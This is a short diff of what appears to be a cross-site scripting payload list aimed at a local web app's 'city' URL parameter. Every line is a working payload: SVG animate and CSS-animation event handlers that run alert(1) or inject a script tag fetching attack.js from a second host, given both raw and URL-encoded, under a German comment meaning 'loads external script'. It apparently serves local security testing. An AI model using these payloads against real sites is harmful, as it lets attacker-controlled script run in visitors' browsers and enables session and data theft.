@@ -8,6 +8,7 @@ http://localhost:4200/?city=<svg><animate+onbegin=alert(1)>
 http://localhost:4200/?city=<svg><animate+onend=alert(1) dur=1s>
 
 # Lädt externes Skript
-http://localhost:4200/?city=<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="s=document.createElement('script');s.src='http://localhost:9999/attack.js';document.body.appendChild(s);"></xss>
+http://localhost:4200/?city=<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="s=document.createElement('script');s.src='http://localhost:9999/attack.js';document.body.appendChild(s);"/>
+--> http://localhost:4200/?city=%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cx%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%27http%3A%2F%2Flocalhost%3A9999%2Fattack.js%27%3Bdocument.body.appendChild%28s%29%3B%22%2F%3E
 http://localhost:4200/?city=<svg><animate+onbegin="s=document.createElement('script');s.src='http://localhost:9999/attack.js';document.body.appendChild(s);">
 --> http://localhost:4200/?city=%3Csvg%3E%3Canimate+onbegin%3D%22s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%27http%3A%2F%2Flocalhost%3A9999%2Fattack.js%27%3Bdocument.body.appendChild%28s%29%3B%22%3E
